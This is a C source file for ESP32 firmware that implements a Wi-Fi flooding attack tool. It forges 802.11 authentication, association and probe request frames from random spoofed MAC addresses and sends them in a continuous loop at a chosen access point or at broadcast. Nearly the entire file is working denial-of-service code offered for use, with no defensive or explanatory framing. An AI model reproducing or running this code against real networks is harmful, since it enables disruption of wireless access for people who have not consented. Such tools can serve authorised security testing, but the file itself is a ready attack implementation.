// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "wifi_flood.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "WIFI_FLOOD";

#define FLOOD_STACK_SIZE 4096
#define FLOOD_DELAY_MS 10 

typedef enum {
  FLOOD_TYPE_AUTH,
  FLOOD_TYPE_ASSOC,
  FLOOD_TYPE_PROBE
} flood_type_t;

static TaskHandle_t flood_task_handle = NULL;
static StackType_t *flood_task_stack = NULL;
static StaticTask_t *flood_task_tcb = NULL;

static bool is_running = false;
static uint8_t g_target[6];
static uint8_t g_channel;
static flood_type_t g_type;

static void send_auth_packet(void) {
  uint8_t packet[128];
  uint8_t mac[6];
  esp_fill_random(mac, 6);
  mac[0] &= 0xFC; 

  int idx = 0;
  packet[idx++] = 0xB0; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  memcpy(&packet[idx], g_target, 6); idx += 6; 
  memcpy(&packet[idx], mac, 6); idx += 6;      
  memcpy(&packet[idx], g_target, 6); idx += 6; 

  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x01; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void send_assoc_packet(void) {
  uint8_t packet[128];
  uint8_t mac[6];
  esp_fill_random(mac, 6);
  mac[0] &= 0xFC; 

  int idx = 0;
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  memcpy(&packet[idx], g_target, 6); idx += 6; 
  memcpy(&packet[idx], mac, 6); idx += 6;      
  memcpy(&packet[idx], g_target, 6); idx += 6; 

  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  packet[idx++] = 0x01; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x0A; 
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
  packet[idx++] = 0x01;
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates)); idx += sizeof(rates);

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void send_probe_packet(void) {
  uint8_t packet[128];
  uint8_t mac[6];
  esp_fill_random(mac, 6);
  mac[0] &= 0xFC; 

  int idx = 0;
  packet[idx++] = 0x40; 
  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  memset(&packet[idx], 0xFF, 6); idx += 6; 
  memcpy(&packet[idx], mac, 6); idx += 6;  
  memset(&packet[idx], 0xFF, 6); idx += 6; 

  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00; 

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
  packet[idx++] = 0x01;
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates)); idx += sizeof(rates);

  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

static void flood_task(void *pvParameters) {
  esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

  while (is_running) {
    switch (g_type) {
      case FLOOD_TYPE_AUTH: send_auth_packet(); break;
      case FLOOD_TYPE_ASSOC: send_assoc_packet(); break;
      case FLOOD_TYPE_PROBE: send_probe_packet(); break;
    }
    vTaskDelay(pdMS_TO_TICKS(FLOOD_DELAY_MS));
  }

  vTaskDelete(NULL);
  flood_task_handle = NULL;
}

static void free_task_memory() {
  if (flood_task_stack) { heap_caps_free(flood_task_stack); flood_task_stack = NULL; }
  if (flood_task_tcb) { heap_caps_free(flood_task_tcb); flood_task_tcb = NULL; }
}

static bool start_flood(const uint8_t *target_bssid, uint8_t channel, flood_type_t type) {
  if (is_running) return false;

  free_task_memory(); // Clean start

  if (target_bssid) memcpy(g_target, target_bssid, 6);
  else memset(g_target, 0xFF, 6);

  g_channel = channel;
  g_type = type;
  is_running = true;

  flood_task_stack = (StackType_t *)heap_caps_malloc(FLOOD_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  flood_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (flood_task_stack && flood_task_tcb) {
    flood_task_handle = xTaskCreateStatic(flood_task, "wifi_flood", FLOOD_STACK_SIZE, NULL, 5, flood_task_stack, flood_task_tcb);
  }

  if (!flood_task_handle) {
    ESP_LOGE(TAG, "Failed to start flood task");
    wifi_flood_stop();
    return false;
  }

  ESP_LOGI(TAG, "Flood started (Type: %d, Ch: %d)", type, channel);
  return true;
}

bool wifi_flood_auth_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, FLOOD_TYPE_AUTH);
}

bool wifi_flood_assoc_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, FLOOD_TYPE_ASSOC);
}

bool wifi_flood_probe_start(const uint8_t *target_bssid, uint8_t channel) {
  return start_flood(target_bssid, channel, FLOOD_TYPE_PROBE);
}

void wifi_flood_stop(void) {
  if (!is_running) return;
  is_running = false;
  vTaskDelay(pdMS_TO_TICKS(100)); 
  free_task_memory();
  ESP_LOGI(TAG, "Flood stopped");
}

bool wifi_flood_is_running(void) {
  return is_running;
}
